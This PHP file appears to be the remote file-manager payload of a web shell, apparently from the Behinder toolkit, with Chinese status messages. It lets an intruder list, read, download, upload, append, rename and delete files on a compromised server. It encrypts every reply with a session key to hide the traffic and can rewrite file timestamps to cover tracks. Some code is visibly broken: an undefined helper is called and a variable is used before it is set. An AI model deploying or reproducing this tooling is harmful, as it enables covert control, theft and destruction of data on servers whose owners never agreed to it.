
error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function getgbkStr($str){
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    if($s1 == $str){
        return $s1;
    }else{
        return iconv('utf-8','gbk//IGNORE',$str);
    }
}
function delDir($dir)
{
    $files = array_diff(scandir($dir), array(
        '.',
        '..'
    ));
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

function main($mode, $path = ".", $content = "", $charset = "",$newpath="",$createTimeStamp="",$accessTimeStamp="",$modifyTimeStamp="")
{
	//$path=getgbkStr($path);
	$path=getSafeStr($path);
    $result = array();
    if ($path == ".")
        $path = getcwd();
    switch ($mode) {
        case "list":
            $allFiles = scandir($path);
            $objArr = array();
            foreach ($allFiles as $fileName) {
                $fullPath = $path . $fileName;
                if (!function_exists("mb_convert_encoding"))
                {
                  $fileName=getSafeStr($fileName);
                }
                else
                {
                	$fileName=mb_convert_encoding($fileName, 'UTF-8', mb_detect_encoding($fileName, "UTF-8,GBK"));
                }
                $obj = array(
                    "name" => base64_encode($fileName),
                    "size" => base64_encode(filesize($fullPath)),
                    "lastModified" => base64_encode(date("Y-m-d H:i:s", filemtime($fullPath)))
                );
                $obj["perm"] = base64_encode((is_readable($fullPath)?"R":"-") . "/" . (is_writable($fullPath)?"W":"-" ). "/" . (is_executable($fullPath)?"E":"-"));
                if (is_file($fullPath)) {
                    $obj["type"] = base64_encode("file");
                } else {
                    $obj["type"] = base64_encode("directory");
                }
                array_push($objArr, $obj);
            }
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode(json_encode($objArr));
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        case "show":
            $contents = file_get_contents($path);               
            $result["status"] = base64_encode("success");
            if (function_exists("mb_convert_encoding"))
            {
                if ($charset=="")
                {
                    $charset = mb_detect_encoding($contents, array(
                        'GB2312',
                        'GBK',
                        'UTF-16',
                        'UCS-2',
                        'UTF-8',
                        'BIG5',
                        'ASCII'
                    ));
                }
                $result["msg"] = base64_encode(mb_convert_encoding($contents, "UTF-8", $charset));
            }
            else
            {
                if ($charset=="")
                {
                    $result["msg"] = base64_encode(getSafeStr($contents));
                }
                else
                {
                    $result["msg"] = base64_encode(iconv($charset, 'utf-8//IGNORE', $contents));
                }
                
            }
            $result = encrypt(json_encode($result),$_SESSION['k']);
            echo $result;
            break;
        case "getTimeStamp":
            $result["status"] = base64_encode("success");
            $timeStampObj = array(
                                "createTime" => base64_encode(date("Y/m/d H:i:s", filectime ($path))),
                                "lastAccessTime" => base64_encode(date("Y/m/d H:i:s", fileatime ($path))),
                                "lastModifiedTime" =>base64_encode(date("Y/m/d H:i:s", filemtime ($path)))
                            );
            $result["msg"] = base64_encode(json_encode($timeStampObj));
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        case "updateTimeStamp":
            if (touch ($path , strtotime($modifyTimeStamp) ,strtotime($accessTimeStamp)))
            {
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("时间戳修改成功。");
            }
            else
            {
            $result["status"] = base64_encode("fail");
            $result["msg"] = base64_encode("时间戳修改失败。");
            }
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        case "download":
            if (! file_exists($path)) {
                header('HTTP/1.1 404 NOT FOUND');
            } else {
                $file = fopen($path, "rb");
                echo fread($file, filesize($path));
                fclose($file);
            }
            break;
        case "delete":
            if (is_file($path)) {
                if (unlink($path)) {
                    $result["status"] = base64_encode("success");
                    $result["msg"] = base64_encode($path . "删除成功");
                } else {
                    $result["status"] = base64_encode("fail");
                    $result["msg"] = base64_encode($path . "删除失败");
                }
            }
            if (is_dir($path)) {
                delDir($path);
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode($path."删除成功");
            }
            echo encrypt(json_encode($result),$_SESSION['k']);
            break;
        case "create":
            $file = fopen($path, "w");
            $content = base64_decode($content);
            fwrite($file, $content);
            fflush($file);
            fclose($file);
            if (file_exists($path) && filesize($path) == strlen($content)) {
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode($path . "上传完成，远程文件大小:" . $path . filesize($path));
            } else {
                $result["status"] = base64_encode("fail");
                $result["msg"] = base64_encode($path . "上传失败");
            }
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        case "createDirectory":
            if (file_exists($path)) {
                    $result["status"] = base64_encode("fail");
                    $result["msg"] = base64_encode("创建失败，目录已存在。");
                }
                else
                {
                mkdir($path);
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode("目录创建成功。");
                }
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        case "append":
            $file = fopen($path, "a+");
            $content = base64_decode($content);
            fwrite($file, $content);
            fclose($file);
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode($path . "追加完成，远程文件大小:" . $path . filesize($path));
            echo encrypt(json_encode($result),$_SESSION['k']);
            break;
        case "rename":
            if (rename($path,$newpath)) {
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode("重命名完成:" . $newpath);
            } else {
                $result["status"] = base64_encode("fail");
                $result["msg"] = base64_encode($path . "重命名失败");
            }
            echo encrypt(json_encode($result), $_SESSION['k']);
            break;
        default:
            break;
    }
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}